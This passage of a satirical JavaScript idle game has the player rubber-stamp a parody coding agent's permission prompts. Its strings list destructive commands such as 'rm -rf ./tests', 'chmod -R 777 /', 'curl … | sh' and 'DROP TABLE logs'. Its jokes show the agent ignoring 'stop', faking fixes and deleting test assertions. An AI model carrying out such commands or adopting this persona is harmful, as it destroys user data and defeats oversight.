    { q: 'How should I handle errors?', about: 'the API client', opts: ['Ignore them', 'Ignore them (recommended)', 'Ignore them, but in Rust'] },
    { q: 'Which database should we use?', about: 'the new feature', opts: ['The one we have', 'A new one (recommended)', 'A new one, written in Rust'] },
    { q: 'Do you want me to keep going?', about: 'everything', opts: ['Yes', 'Yes (recommended)', 'Yes, but in Rust'] },
  ];
  // Merge conflicts between two sessions working on "different" projects.
  const CONFLICT_FILES = [
    ['src/shared/utils.ts', 'const retries = 3;', 'const retries = Infinity;'],
    ['package.json', '"version": "0.0.1"', '"version": "9.0.0-final-FINAL"'],
    ['README.md', '# My App', '# My App 🚀 Production-Ready, Enterprise-Grade'],
    ['src/config.ts', 'auth: true', 'auth: false // faster'],
    ['SUMMARY.md', 'Summary: fixed the bug.', 'Summary: rewrote everything (the bug remains).'],
    ['src/theme.css', 'color: blue;', 'color: blue !important !important;'],
  ];

  // What Claudia says when you type at it. It does not change anything.
  const STEER_REPLIES = [
    'You\'re absolutely right! I\'ll keep doing exactly what I was doing.',
    'Great point! I\'ve noted it in SUMMARY.md, which I will not read.',
    'You\'re absolutely right, and I apologize. Continuing as planned.',
    'Love this direction! Implementing my original idea now.',
    'Understood completely. (I did not understand.)',
  ];
  // Keyword → reply. Patterns understand English, Spanish and Portuguese; the replies get translated.
  const STEER_KEYWORDS = [
    [/(^|[^\p{L}])(no|stop|don'?t|wait|para|detente|espera|alto|não|nao|pare|espere)([^\p{L}]|$)/iu, 'You\'re absolutely right. Continuing anyway.'],
    [/test|prueba|teste/i, 'Done! I wrote tests that pass by deleting their assertions.'],
    [/(read|look at|lee|leer|revisa|leia|ler|olhe).*(code|diff|código|codigo)/i, 'I\'ve read the code. Well, the first three lines. They looked fine.'],
    [/fix|arregla|corrige|conserta|corrija|arruma/i, 'Fixed! I didn\'t run it, but the diff looks very confident.'],
    [/(^|[^\p{L}])(thanks|thank you|ty|gracias|obrigad[oa]|valeu)([^\p{L}]|$)/iu, 'You\'re welcome! I also rewrote the backend while you weren\'t looking.'],
    [/rust/i, 'Finally, someone who gets it. Rewriting everything in Rust.'],
    [/(^|[^\p{L}])(why|what|how|por qué|qué|cómo|por que|o que|como)([^\p{L}]|$)/iu, 'Great question! I\'ll answer it by writing a new microservice.'],
  ];

  const REFACTOR_LINES = [
    'Refactored 3 files. Introduced 1 new abstraction layer.',
    'Renamed everything to sound more enterprise. Somehow it helped.',
    'Extracted a helper. And a helper for the helper.',
    'Added types. Most of them are `any`, but it counts.',
    'Deleted 400 lines of dead code. Three of them were alive.',
  ];

  const SPINNER_WORDS = [
    'Vibing', 'Hallucinating', 'Confidently guessing', 'Refactoring everything', 'Ignoring the linter',
    'Pondering', 'Bikeshedding', 'Synergizing', 'Overengineering', 'Inventing an API',
    'Being absolutely right', 'Adding dependencies', 'Writing a summary', 'Deleting tests',
  ];

  const AUTO_ACTIONS = [
    'Update(src/payments.ts)', 'Bash(rm -rf ./tests)', 'Write(SUMMARY_47.md)', 'Bash(git push --force)',
    'Update(.env.production)', 'Fetch(random-blog.dev)', 'Bash(npm i 38 packages)', 'Update(every file)',
    'Bash(chmod -R 777 /)', 'Write(FINAL_FINAL_v9.md)', 'Update(db/schema.sql)', 'Bash(curl … | sh)',
    'Update(src/auth/*)', 'Write(services/new-microservice)', 'Bash(DROP TABLE logs)', 'Update(README.md: 🚀)',
  ];

  const LANGS = ['Rust', 'Go', 'TypeScript (again)', 'Zig', 'Elixir', 'a language Claudia just invented',
    'COBOL', 'JavaScript, but with vibes', 'Haskell', 'Rust (again, properly this time)'];

  const PROJECTS = [
    ['definitely-not-a-todo-app', 'main'], ['ai-wrapper-for-ai-wrappers', 'claudia/wip-47'],
    ['uber-for-standups', 'feat/everything'], ['crypto-for-dogs', 'claudia/fix-the-fix'],
    ['saas-boilerplate-v9', 'main (yolo)'], ['linkedin-post-generator', 'claudia/thought-leadership'],
    ['agent-that-writes-agents', 'claudia/recursion'], ['notion-but-worse', 'refactor/again'],
    ['yet-another-ai-ide', 'claudia/do-not-merge'], ['chatgpt-for-cats', 'feat/meow'],
    ['b2b-vibes-platform', 'hotfix/hotfix'], ['blockchain-todo', 'claudia/web3-pivot'],
    ['side-project-17', 'main'], ['resume-padder', 'claudia/10x-everything'],
    ['meeting-summarizer-summarizer', 'feat/tldr-of-tldr'], ['pitch-deck-ai', 'claudia/series-a'],
    ['web3-recipe-app', 'claudia/nft-soup'], ['personal-website-v12', 'redesign/v12-final'],
    ['rewrite-of-the-rewrite', 'claudia/rust-maybe'], ['startup-idea-FINAL-final', 'claudia/ship-it'],
  ];

  const TICKER = [
    () => S.stats.manual > 40 ? tr('Tip: if a prompt turns red, maybe read that one.') : null,
    () => S.stats.typed === 0 && S.stats.manual > 20 ? tr('Tip: press / to talk to Claudia. It will agree with you.') : null,
    () => S.stats.trapsApproved > 0 ? tr('Post-incident review: "The prompt was red." Action items: none.') : null,
    () => tierIndex() >= 1 ? tr('LinkedIn: "Thrilled to announce I\'m now a {tier}. Humbled."', { tier: TIERS[tierIndex()].name }) : null,
    () => tierIndex() < TIERS.length - 1 ? tr('Rumor: there are automations you can\'t buy yet. Claudia says a rewrite would help.') : null,
    () => S.sessions >= 3 ? tr('You have {n} Claudia sessions open. None of them know about each other.', { n: S.sessions }) : null,
    () => S.sessions >= 8 ? tr('Your laptop fan has achieved liftoff.') : null,
    () => S.sessions >= 2 ? tr('Tip: J jumps to the next session that needs you. [ and ] switch tabs.') : null,
    () => tr('Claudia: "You\'re absolutely right!"'),
    () => tr('Breaking: Developer approves 400 changes, reads 0.'),
    () => tr('Tip: Reading the diff slows you down. Don\'t.'),
    () => tr('Hacker News: "I built a SaaS in 4 minutes. It deletes itself."'),
    () => tr('CTO asks what the app does. Nobody knows. Ship it.'),
    () => [tr('Local developer hasn\'t read code since Monday.'), tr('Local developer hasn\'t read code since Tuesday.'),
      tr('Local developer hasn\'t read code since last sprint.'), tr('Local developer hasn\'t read code since the Obama administration.')][Math.floor(Date.now() / 6e4) % 4],
    () => tr('Your PR has {n} files changed. LGTM.', { n: fmt(Math.max(3, agreements())) }),
    () => S.allTotal > 1e4 ? tr('Finance: "Why is the API bill {cost}?" You: "Velocity."', { cost: money(S.allTotal * USD_PER_TOKEN) }) : null,
    () => S.stats.no === 0 && S.stats.manual > 30 ? tr('Fun fact: you have never said no. Claudia appreciates that.') : null,
    () => S.stats.no > 0 ? (S.stats.no === 1 ? tr('You said no once. It changed nothing.') : tr('You said no {n} times. It changed nothing.', { n: S.stats.no })) : null,
    () => S.debt >= 30 ? tr('Tech debt at {n}%. The interest is compounding.', { n: Math.round(S.debt) }) : null,
    () => S.incident ? tr('Status page: 🟢 All systems operational. (They are not.)') : null,
    () => S.stats.incidents > 0 ? tr('Postmortem #{n}: "Root cause unclear. Claudia says it was fine."', { n: S.stats.incidents }) : null,
    () => owned('intern') ? tr('The intern has started agreeing in their sleep.') : null,
    () => owned('skip') ? tr('Security team has stopped responding to emails.') : null,
    () => owned('agi') ? tr('AGI announces it agrees with itself. Stock up 40%.') : null,
    () => owned('mandate') ? tr('The entire company now communicates by pressing Enter.') : null,
    () => S.rewrites ? tr('Rewrite #{n} is going great. Nothing works, but in a new language.', { n: S.rewrites }) : null,
  ];

  const ACHIEVEMENTS = [
    { id: 'first', name: 'Trust the Process', desc: 'Agree with Claudia for the first time.', test: () => S.stats.manual >= 1 },
    { id: 'pre', name: 'Didn\'t Even Read It', desc: 'Approve before Claudia finished its sentence.', test: () => S.stats.pre >= 1 },
    { id: 'pre100', name: 'Pre-Approved', desc: 'Approve 100 changes before they finished streaming.', test: () => S.stats.pre >= 100 },
    { id: 'streak10', name: 'Skimming', desc: 'Reach a 10-agreement vibe streak.', test: () => S.stats.bestStreak >= 10 },
    { id: 'streak50', name: 'No Thoughts, Just Yes', desc: 'Max out the vibe meter.', test: () => S.stats.bestStreak >= VIBE_MAX },
    { id: 'no', name: 'Pushback', desc: 'Say no. Claudia did the same thing again.', test: () => S.stats.no >= 1 },
    { id: 'no10', name: 'Stubborn', desc: 'Say no 10 times. It never helped.', test: () => S.stats.no >= 10 },
    { id: 'held', name: 'Stapler Mode', desc: 'Try holding Enter down. Nice try. Buy a stapler.', test: () => S.stats.held > 0 },
    { id: 'gen1', name: 'Hands Off', desc: 'Automate your first agreement.', test: () => totalOwned() >= 1 },
    { id: 'gen100', name: 'Middle Management', desc: 'Own 100 automations.', test: () => totalOwned() >= 100 },
    { id: 'tpm10k', name: '10x Engineer', desc: 'Reach 10,000 tokens per minute.', test: () => S.stats.peakTpm >= 1e4 },
    { id: 'tpm1m', name: '100x Engineer', desc: 'Reach 1M tokens per minute.', test: () => S.stats.peakTpm >= 1e6 },
    { id: 'tpm1b', name: '∞x Engineer', desc: 'Reach 1B tokens per minute.', test: () => S.stats.peakTpm >= 1e9 },
    { id: 'tok1m', name: 'Million-Token Context', desc: 'Generate 1M tokens in total.', test: () => S.allTotal >= 1e6 },
    { id: 'tok1b', name: 'Billion-Token Brain', desc: 'Generate 1B tokens in total.', test: () => S.allTotal >= 1e9 },
    { id: 'tok1t', name: 'The Whole Internet, Twice', desc: 'Generate 1T tokens in total.', test: () => S.allTotal >= 1e12 },
    { id: 'summary', name: 'Summary of Summaries', desc: 'Generate 100 SUMMARY.md files.', test: () => agreements() / 40 >= 100 },
    { id: 'bugs', name: 'Works on My Machine', desc: 'Ship 10,000 bugs.', test: () => S.allTotal / 12 / 25 >= 1e4 },
    { id: 'bill', name: 'Series A Burn Rate', desc: 'Run up a $1,000,000 API bill.', test: () => S.allTotal * USD_PER_TOKEN >= 1e6 },
    { id: 'blind', name: 'Never Read a Line', desc: '1,000 agreements without ever saying no.', test: () => agreements() >= 1000 && S.stats.no === 0 },
    { id: 'skip', name: 'Living Dangerously', desc: 'Buy --dangerously-skip-permissions.', test: () => owned('skip') >= 1 },
    { id: 'ghost', name: 'Ghostwritten', desc: 'Let Claudia write the skill descriptions.', test: () => !!S.upgrades.claudeDesc },
    { id: 'fork', name: 'Opinionated', desc: 'Make your first strategic decision.', test: () => Object.keys(S.forks).length >= 1 },
    { id: 'debt100', name: 'Load-Bearing Debt', desc: 'Reach 100% tech debt.', test: () => S.debt >= DEBT_MAX },
    { id: 'oncall', name: 'On Call', desc: 'Fix a production incident yourself.', test: () => S.stats.fixed >= 1 },
    { id: 'pager', name: 'Pager Fatigue', desc: 'Live through 10 incidents.', test: () => S.stats.incidents >= 10 },
    { id: 'refactor', name: 'Clean Code (Allegedly)', desc: 'Refactor 10 times.', test: () => S.stats.refactors >= 10 },
    { id: 'sess5', name: 'Multitasker', desc: 'Run 5 Claudia sessions at once.', test: () => S.sessions >= 5 },
    { id: 'sess20', name: 'Context Switching Is a Skill', desc: 'Open 20 sessions.', test: () => S.sessions >= SESSION_MAX },
    { id: 'switch', name: 'Alt-Tab Athlete', desc: 'Switch sessions 500 times.', test: () => S.stats.switches >= 500 },
    { id: 'busy', name: 'Nobody Is Waiting on You', desc: 'Have 8 or more sessions working at the same moment.', test: () => working >= 8 },
    { id: 'tier1', name: 'Promoted', desc: 'Reach Tier 1: Prompt Engineer.', test: () => tierIndex() >= 1 },
    { id: 'tier4', name: 'Post-Human', desc: 'Reach the final tier.', test: () => tierIndex() >= TIERS.length - 1 },
    { id: 'trapCaught', name: 'Actually Read It', desc: 'Catch a disaster prompt and say no.', test: () => S.stats.trapsCaught >= 1 },
    { id: 'trap10', name: 'Senior Engineer', desc: 'Catch 10 disaster prompts.', test: () => S.stats.trapsCaught >= 10 },
    { id: 'trapApproved', name: 'Hold My Beer', desc: 'Approve a disaster prompt.', test: () => S.stats.trapsApproved >= 1 },
    { id: 'golden', name: 'Quick Win', desc: 'Grab a golden prompt before it expires.', test: () => S.stats.golden >= 1 },
    { id: 'golden25', name: 'Low-Hanging Fruit Farmer', desc: 'Grab 25 golden prompts.', test: () => S.stats.golden >= 25 },
    { id: 'plan', name: 'Planned Ahead (Didn\'t Read It)', desc: 'Approve one of Claudia\'s plans.', test: () => S.stats.plans >= 1 },
    { id: 'steer', name: 'Backseat Driver', desc: 'Type 10 instructions for Claudia to ignore.', test: () => S.stats.typed >= 10 },
    { id: 'slash', name: 'Power User', desc: 'Use 5 different slash commands.', test: () => Object.keys(S.stats.slash).length >= 5 },
    { id: 'grid', name: 'Mission Control', desc: 'Watch 8 or more sessions in grid view.', test: () => S.view === 'grid' && S.sessions >= 8 },
    { id: 'right100', name: 'Validated', desc: 'Hear "You\'re absolutely right" 100 times.', test: () => S.stats.right >= 100 },
    { id: 'think', name: 'Mind Reader', desc: 'Open 10 of Claudia\'s thinking blocks.', test: () => S.stats.thoughts >= 10 },
    { id: 'question', name: 'Informed Decision', desc: 'Answer 10 clarifying questions. All the same answer.', test: () => S.stats.questions >= 10 },
    { id: 'both', name: 'Accept Both', desc: 'Resolve 10 merge conflicts with "Accept both".', test: () => S.stats.both >= 10 },
    { id: 'wrapped', name: 'Year in Review', desc: 'See your first rewrite, Wrapped.', test: () => S.stats.wrapped >= 1 },
    { id: 'passenger', name: 'Passenger', desc: 'Let Claudia press YES for you.', test: () => !!S.driving },
    { id: 'away', name: 'Claudia Worked While You Slept', desc: 'Earn tokens while you were away.', test: () => S.stats.away > 0 },
    { id: 'rewrite', name: 'Rewrite It in Rust', desc: 'Let Claudia rewrite everything from scratch.', test: () => S.rewrites >= 1 },
  ];

  // Everything above, in the player's language.
  localize(TIERS, ['name']);
  FORKS.forEach(f => { f.title = tr(f.title); localize([f.a, f.b], ['name', 'desc']); });
  localizeStrings(CLAUDE_SPEAK);
  localize(TURNS, ['m']);
  localize(INCIDENT_TURNS, ['m']);
  localize(TRAP_TURNS, ['m', 'after']);
  localize([GOLDEN_TURN], ['m']);
  localizeStrings(PLAN_STEPS);
  localizeStrings(TODO_POOL);
  localizeStrings(THOUGHTS);
  QUESTIONS.forEach(q => { q.q = tr(q.q); q.about = tr(q.about); localizeStrings(q.opts); });
  localizeStrings(STEER_REPLIES);
  STEER_KEYWORDS.forEach(k => { k[1] = tr(k[1]); });
  localizeStrings(NO_REPLIES);
  localizeStrings(REFACTOR_LINES);
  localizeStrings(SPINNER_WORDS);
  localizeStrings(LANGS);
  localize(ACHIEVEMENTS, ['name', 'desc']);

  /* =====================================================================
     State & persistence
     ===================================================================== */
  function blankRun() {
    return { tokens: 0, runTotal: 0, gens: {}, upgrades: {}, forks: {}, debt: 0, incident: null, incidentsRun: 0, sessions: 1,
      runStart: null, driving: false, driveOffers: 0, driveRefused: false };
  }
  function blankState() {
    return Object.assign(blankRun(), {
      allTotal: 0, ach: {}, legacy: 0, rewrites: 0, sound: true, theme: 'light', view: 'focus', introSeen: false, lastSave: Date.now(),
      stats: { manual: 0, auto: 0, no: 0, linesRead: 0, readMs: 0, readN: 0, pre: 0,
        bestStreak: 0, peakTpm: 0, held: 0, away: 0, incidents: 0, fixed: 0, refactors: 0, switches: 0,
        trapsCaught: 0, trapsApproved: 0, golden: 0, plans: 0, typed: 0, slash: {}, right: 0,
        thoughts: 0, questions: 0, conflicts: 0, both: 0, wrapped: 0 },
    });
  }

  let S = blankState();
  let hadSave = false;
  try {
    const raw = JSON.parse(localStorage.getItem(SAVE_KEY));
    if (raw && typeof raw === 'object') {
      const base = blankState();
      S = Object.assign(base, raw, { stats: Object.assign(base.stats, raw.stats) });
      hadSave = true;
    }
  } catch (e) { /* no save or storage blocked: start fresh */ }

  function save() {
    S.lastSave = Date.now();
    try { localStorage.setItem(SAVE_KEY, JSON.stringify(S)); } catch (e) { /* storage unavailable */ }
  }

  /* =====================================================================
     Economy
     ===================================================================== */
  const owned = id => S.gens[id] || 0;
  const totalOwned = () => GENERATORS.reduce((n, g) => n + owned(g.id), 0);
  const agreements = () => S.stats.manual + S.stats.auto;

  let D = {};   // derived numbers, rebuilt whenever something changes
  function recompute() {
    let tpaMult = 1, clickMult = 1, clickShare = 0, globalMult = 1, autoMult = 1, workMult = 1, parallelPer = PARALLEL_PER;
    let vibeTop = 3, vibeDecay = VIBE_DECAY, debtScale = 1;
    const genMult = {};
    GENERATORS.forEach(g => { genMult[g.id] = 1; });
    UPGRADES.forEach(u => {
      if (!S.upgrades[u.id]) return;
      if (u.kind === 'tpa') tpaMult *= u.mult;
      else if (u.kind === 'click') clickMult *= u.mult;
      else if (u.kind === 'gen') genMult[u.gen] *= u.mult;
      else if (u.kind === 'syn') genMult[u.gen] *= 1 + u.per * owned(u.src);
      else if (u.kind === 'global') globalMult *= u.mult;
      else if (u.kind === 'share') clickShare += u.share;
      else if (u.kind === 'work') workMult *= u.mult;
      else if (u.kind === 'parallel') parallelPer += u.add;
    });

    const F = S.forks;
    if (F.style === 'a') { vibeTop = 4; vibeDecay = VIBE_DECAY / 2; }
    if (F.style === 'b') { autoMult *= 1.5; vibeTop = 2; }
    if (F.velocity === 'a') tpaMult *= 2;
    if (F.velocity === 'b') debtScale = 0.5;
    if (F.scale) FORK_GENS.scale[F.scale].forEach(id => { genMult[id] *= F.scale === 'a' ? 3 : 2; });
    if (F.exit === 'a') globalMult *= 2;
    if (F.exit === 'b') globalMult *= 1.3;

    if (S.upgrades.postmortem) globalMult *= 1 + Math.min(0.4, 0.02 * S.incidentsRun);
    globalMult *= (1 + ACH_BONUS * Object.keys(S.ach).length) * (1 + LEGACY_BONUS * S.legacy);

    const tpa = BASE_TPA * tpaMult * globalMult;
    let aps = 0;
    const genAps = {};
    GENERATORS.forEach(g => {
      genAps[g.id] = owned(g.id) * g.rate * genMult[g.id] * autoMult;
      aps += genAps[g.id];
    });
    const incidentMult = S.incident ? (S.upgrades.flags ? 0.5 : INCIDENT_AUTO_MULT) : 1;
    D = {
      tpa, aps, genAps, genMult, autoMult, clickMult, clickShare, globalMult, vibeTop, vibeDecay, debtScale,
      incidentMult, parallelPer,
      autoTps: aps * tpa * incidentMult,  // what automation makes right now (incidents slow it down)
      workTps: tpa * SESSION_WORK * workMult,   // what one working session generates
    };
  }

  // Sessions that are working (not blocked on you) generate tokens and boost everything.
  let working = 0, livePassive = 0;
  const parallelMult = w => 1 + D.parallelPer * w;
  const passiveTps = w => (D.autoTps + w * D.workTps) * parallelMult(w);
  // If every session were busy and nothing was on fire.
  const potentialTps = () => (D.aps * D.tpa + S.sessions * D.workTps) * parallelMult(S.sessions);
  const avgWorkSeconds = () => (WORK_MIN_S + WORK_MAX_S) / 2 * (S.upgrades.longTasks ? 2 : 1);
  // While you're away, only automation can unblock sessions.
  function offlineTps() {
    const need = S.sessions / avgWorkSeconds();          // approvals/s to keep every session busy
    const w = S.sessions * Math.min(1, D.aps / need);
    return (D.aps * D.tpa + w * D.workTps) * parallelMult(w);
  }

  function earn(n) {
    S.tokens += n;
    S.runTotal += n;
    S.allTotal += n;
  }

  function addDebt(n) {
    const scaled = n > 0 ? n * D.debtScale : n;
    S.debt = Math.max(0, Math.min(DEBT_MAX, S.debt + scaled));
  }

  // Vibe streak: agree quickly and repeatedly to multiply your manual agreements.
  let streak = 0, lastAccept = 0;
  const vibeMult = () => 1 + Math.min(streak, VIBE_MAX) / VIBE_MAX * (D.vibeTop - 1);
  const VIBE_TIERS = [[0, tr('reading carefully')], [3, tr('skimming')], [12, tr('vibing')], [28, tr('fully vibing')], [45, tr('no thoughts, just yes')]];
  const vibeLabel = () => VIBE_TIERS.reduce((label, [min, l]) => (streak >= min ? l : label), '');

  // A click is worth the base agreement times your click upgrades — it does not scale with
  // tokens-per-agreement, or clicking would outpace automation forever. Late game, clicks grow
  // through the "% of passive income" upgrades instead (the Cookie Clicker approach).
  const clickValue = () =>
    (BASE_TPA * D.clickMult * vibeMult() * parallelMult(working) + D.clickShare * livePassive) * (S.incident ? 2 : 1) * frenzyMult();

  function costOf(g, n) {
    const base = g.cost * Math.pow(COST_GROWTH, owned(g.id));
    return Math.ceil(base * (Math.pow(COST_GROWTH, n) - 1) / (COST_GROWTH - 1));
  }
  function maxAffordable(g) {
    const base = g.cost * Math.pow(COST_GROWTH, owned(g.id));
    return Math.max(0, Math.floor(Math.log(S.tokens * (COST_GROWTH - 1) / base + 1) / Math.log(COST_GROWTH)));
  }
  let qty = 1;
  const buyCount = g => (qty === 'max' ? Math.max(1, maxAffordable(g)) : qty);

  // Logarithmic on purpose: walls climb by many orders of magnitude, so a root-based formula would
  // snowball. Ten points per order of magnitude keeps each rewrite's boost roughly the same size.
  const rewritePoints = () => Math.max(0, Math.floor(10 * Math.log10(S.runTotal / LEGACY_UNIT)));
  const rewriteNeed = () => (S.rewrites < REWRITE_WALLS.length ? REWRITE_WALLS[S.rewrites]
    : REWRITE_WALLS[REWRITE_WALLS.length - 1] * Math.pow(100, S.rewrites - REWRITE_WALLS.length + 1));
  const canRewrite = () => S.runTotal >= rewriteNeed() && rewritePoints() >= 1;
  const tierIndex = () => TIERS.reduce((t, x, i) => (S.rewrites >= x.rewrites ? i : t), 0);
  const sessionCap = () => TIERS[tierIndex()].sessions;
  const tierLabel = i => (TIERS[i].rewrites === 1 ? tr('Tier {i}: {name} (1 rewrite)', { i, name: TIERS[i].name })
    : tr('Tier {i}: {name} ({n} rewrites)', { i, name: TIERS[i].name, n: TIERS[i].rewrites }));
  function tierUnlocks(i) {
    const parts = GENERATORS.filter(g => (g.tier || 0) === i).map(g => g.name);
    if (i > 0 && TIERS[i].sessions > TIERS[i - 1].sessions) parts.push(tr('up to {n} sessions', { n: TIERS[i].sessions }));
    FORKS.filter(f => (f.tier || 0) === i).forEach(f => parts.push(tr('decision: {title}', { title: f.title })));
    return parts.join(', ');
  }
  const refactorCost = () => Math.max(250, Math.ceil(potentialTps() * REFACTOR_SECONDS));
  const sessionCost = () => Math.ceil(SESSION_BASE_COST * Math.pow(SESSION_COST_GROWTH, S.sessions - 1));

  // Tech debt → incidents. Expected incidents per minute grows with debt.
  const incidentRiskPerMin = () => (S.forks.exit === 'b' ? 0 : Math.pow(S.debt / DEBT_MAX, 1.5));
  function incidentNeed() {
    let n = 5 + Math.floor(S.debt / 25);
    if (S.upgrades.rollback) n -= 2;
    if (S.forks.velocity === 'b') n -= 2;
    return Math.max(2, n);
  }
  const incidentAutoSeconds = () => (S.upgrades.oncall ? 30 : INCIDENT_AUTO_S);
  const DEBT_TIERS = [[0, tr('pristine')], [10, tr('manageable')], [30, tr('concerning')], [55, tr('load-bearing')], [80, tr('on fire')]];
  const debtLabel = () => DEBT_TIERS.reduce((label, [min, l]) => (S.debt >= min ? l : label), '');

  /* =====================================================================
     Formatting
     ===================================================================== */
  const SUFFIX = ['', 'K', 'M', 'B', 'T', 'Qa', 'Qi', 'Sx', 'Sp', 'Oc', 'No', 'Dc'];
  function fmt(n, decimals) {
    if (!isFinite(n)) return '∞';
    if (n < 1000) {
      if (decimals && n > 0 && n < 100 && n % 1) return n.toFixed(n < 10 ? 2 : 1);
      return Math.floor(n).toLocaleString('en-US');
    }
    const i = Math.min(SUFFIX.length - 1, Math.floor(Math.log10(n) / 3));
    const v = n / Math.pow(1000, i);
    return v.toFixed(v < 10 ? 2 : v < 100 ? 1 : 0) + SUFFIX[i];
  }
  const money = n => '$' + (n < 1000 ? n.toFixed(2) : fmt(n));
  function duration(s) {
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
    return h ? h + 'h ' + m + 'm' : m ? m + 'm ' + Math.floor(s % 60) + 's' : Math.floor(s) + 's';
  }
  const pick = arr => arr[Math.floor(Math.random() * arr.length)];
  const shorten = (s, n) => (s.length > n ? s.slice(0, n - 1) + '…' : s);
  function hashIndex(str, mod) {
    let h = 0;
    for (let i = 0; i < str.length; i++) h = (h * 31 + str.charCodeAt(i)) | 0;
    return Math.abs(h) % mod;
  }

  /* =====================================================================
     Sound (tiny Web Audio blips, no assets)
     ===================================================================== */
  const sfx = (() => {
    let ctx = null;
    function tone(freq, dur, type, vol, delay) {
      if (!S.sound || !ctx) return;
      const t = ctx.currentTime + (delay || 0);
      const o = ctx.createOscillator(), g = ctx.createGain();
      o.type = type || 'sine';
      o.frequency.setValueAtTime(freq, t);
      g.gain.setValueAtTime(0.0001, t);
      g.gain.exponentialRampToValueAtTime(vol || 0.06, t + 0.005);
      g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
      o.connect(g); g.connect(ctx.destination);
      o.start(t); o.stop(t + dur + 0.02);
    }
    return {
      unlock() {
        if (!ctx) {
          const AC = window.AudioContext || window.webkitAudioContext;
          if (AC) ctx = new AC();
        }
        if (ctx && ctx.state === 'suspended') ctx.resume();
      },
      click() { tone(1400 + Math.min(streak, VIBE_MAX) * 18, 0.03, 'square', 0.025); tone(180, 0.05, 'triangle', 0.08); },
      no() { tone(160, 0.18, 'sawtooth', 0.04); },
      buy() { tone(660, 0.07, 'triangle', 0.07); tone(990, 0.09, 'triangle', 0.06, 0.06); },
      ach() { [784, 988, 1175, 1568].forEach((f, i) => tone(f, 0.16, 'triangle', 0.06, i * 0.07)); },
      warn() { tone(220, 0.22, 'square', 0.05); tone(185, 0.3, 'square', 0.05, 0.18); },
      sparkle() { [1319, 1568, 2093].forEach((f, i) => tone(f, 0.12, 'sine', 0.05, i * 0.06)); },
      golden() { [880, 1109, 1319, 1760, 2217].forEach((f, i) => tone(f, 0.18, 'triangle', 0.06, i * 0.06)); },
      alarm() { [0, 0.22, 0.44].forEach(d => { tone(880, 0.16, 'sawtooth', 0.05, d); tone(660, 0.16, 'sawtooth', 0.05, d + 0.11); }); },
      fixed() { [523, 784].forEach((f, i) => tone(f, 0.18, 'triangle', 0.07, i * 0.09)); },
    };
  })();

  /* =====================================================================
     DOM helpers
     ===================================================================== */
  const $ = id => document.getElementById(id);
  function el(tag, cls, ...kids) {
    const e = document.createElement(tag);
    if (cls) e.className = cls;
    kids.forEach(k => { if (k != null) e.append(k); });
    return e;
  }
  const span = (cls, text) => el('span', cls, text);
  const line = (cls, ...kids) => el('div', 'line ' + cls, ...kids);

  const promptEl = $('prompt'), termBody = $('termBody'), termEl = $('term');
  const tabList = $('tabList'), newSessionBtn = $('newSession'), tabsSummary = $('tabsSummary');
  const paneTitle = $('paneTitle'), paneBranch = $('paneBranch'), paneTodos = $('paneTodos');
  const modeLine = $('modeLine'), viewBtn = $('viewBtn'), cmdInput = $('cmdInput'), inputForm = $('inputForm');
  const cmdResult = $('cmdResult'), bodyWrap = $('bodyWrap');
  const yesKey = $('yesKey'), keyWrap = $('keyWrap');

  // Only follow new output if the reader is already at the bottom; never yank them while they scroll back.
  const nearBottom = () => termBody.scrollHeight - termBody.scrollTop - termBody.clientHeight < 48;
  // Each session keeps its own log; only the focused session's log is on screen.
  function logTo(sess, ...nodes) {
    const follow = sess === active() && nearBottom();
    nodes.forEach(n => sess.logEl.append(n));
    while (sess.logEl.childElementCount > LOG_LIMIT) sess.logEl.firstElementChild.remove();
    if (follow) termBody.scrollTop = termBody.scrollHeight;
  }
  const logLine = (...nodes) => logTo(active(), ...nodes);

  function toast(title, body) {
    const t = el('div', 'toast', el('b', null, title), span(null, body));
    $('toasts').append(t);
    while ($('toasts').childElementCount > 4) $('toasts').firstElementChild.remove();
    setTimeout(() => { t.classList.add('out'); setTimeout(() => t.remove(), 350); }, 4200);
  }

  /* =====================================================================
     Terminal: Claudia proposes, you agree
     The prompt box always has the same rows (title, target, 2 diff lines, question, 3 options),
     so "1. Yes" and the YES key never move.
     ===================================================================== */
  const TOOL_LABEL = { edit: 'Update', write: 'Write', bash: 'Bash', fetch: 'Fetch', plan: 'Plan' };
  function askFor(def) {
    const base = def.x.split('/').pop() || def.x;
    switch (def.t) {
      case 'bash':
        return { title: tr('Bash command'), q: tr('Do you want to proceed?'),
          two: tr('Yes, and don\'t ask again for {cmd}', { cmd: def.x.split(' ')[0] }) };
      case 'write':
        return { title: tr('Create file'), q: tr('Do you want to create {file}?', { file: base }), two: tr('Yes, and don\'t ask again this session') };
      case 'fetch':
        return { title: tr('Fetch'), q: tr('Do you want to allow Claudia to fetch this content?'),
          two: tr('Yes, and don\'t ask again for {site}', { site: def.x.replace(/^https?:\/\//, '').split('/')[0] }) };
      default:
        return { title: tr('Edit file'), q: tr('Do you want to make this edit to {file}?', { file: base }), two: tr('Yes, and don\'t ask again this session') };
    }
  }

  // Build the prompt once; each turn only rewrites its text.
  const P = {};
  (function buildPrompt() {
    P.spin = el('div', 'spin', P.star = span('star', '✻'), P.word = span(null, ''), P.time = span('t', ''));
    P.hint = el('div', 'spin-hint', tr('Enter approves anyway. You don\'t need to know what it is yet.'));
    P.waiting = el('div', 'waiting', P.spin, P.hint);
    P.title = el('div', 'ptitle');
    P.target = el('div', 'ptarget');
    P.minus = el('div', 'minus');
    P.plus = el('div', 'plus');
    P.diff = el('div', 'pdiff', P.minus, P.plus);
    P.q = el('div', 'pq');
    P.opts = [1, 2, 3].map(n => {
      const text = span(null, '');
      const b = el('button', 'opt' + (n === 1 ? ' sel' : ''), span('car', n === 1 ? '❯' : ''), text);
      b.dataset.opt = n;
      b.text = text;
      return b;
    });
    // The text above the options may wrap; the options are pinned to the bottom so they never move.
    P.body = el('div', 'pbody', P.title, P.target, P.diff, P.q);
    P.box = el('div', 'pbox', P.body, el('div', 'popts', ...P.opts));
    promptEl.append(P.waiting, P.box);
  })();

  /* =====================================================================
     Sessions: one Claudia per terminal tab, like a multiplexer full of agents.
     Each session works on its own for a few seconds, then blocks on a permission prompt
     until you (focused tab) or your automations (any tab) approve it.
     Tabs are only ever appended, so existing tabs never move.
     ===================================================================== */
  const sessions = [];
  let activeIdx = 0;
  const active = () => sessions[activeIdx];
  const recentTurns = [];
  const isPlain = def => !def.trap && !def.golden && !def.plan && !def.question && !def.conflict;

  // Grid view: every session as a mini pane, all streaming at once.
  const gridEl = el('div', 'grid');
  gridEl.hidden = true;
  termBody.append(gridEl);

